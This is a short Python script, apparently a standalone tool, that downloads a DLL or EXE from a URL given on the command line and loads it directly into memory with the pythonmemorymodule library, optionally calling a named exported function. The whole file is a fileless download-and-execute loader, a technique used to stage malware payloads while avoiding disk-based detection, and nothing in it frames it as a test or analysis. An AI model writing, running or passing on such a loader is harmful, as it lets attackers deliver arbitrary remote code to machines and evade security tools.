import sys
import urllib.request
import ctypes
import pythonmemorymodule
import argparse

parser = argparse.ArgumentParser(description="Load a DLL or EXE from a URL into memory")

# Add the arguments
parser.add_argument('Url', metavar='url', type=str, help='the URL to download the DLL or EXE from')
parser.add_argument('Type', metavar='type', type=str, help='the file type (dll or exe)')
parser.add_argument('--Method', metavar='method', type=str, help='the method to call if it\'s a DLL')

# Parse the arguments
args = parser.parse_args()

url = args.Url
file_type = args.Type.lower()
method = args.Method # Get the URL from command line arguments

request = urllib.request.Request(url)
result = urllib.request.urlopen(request)
buf = result.read()

if file_type == 'dll':
    dll = pythonmemorymodule.MemoryModule(data=buf, debug=True)
    if method:
        startDll = dll.get_proc_addr(method)
        assert startDll(), f"Failed to execute '{method}' procedure"
elif file_type == 'exe':
    exe = pythonmemorymodule.MemoryModule(data=buf, debug=True)
else:
    print(f"Unknown file type: {file_type}")
    sys.exit(1)

#dll.free_library()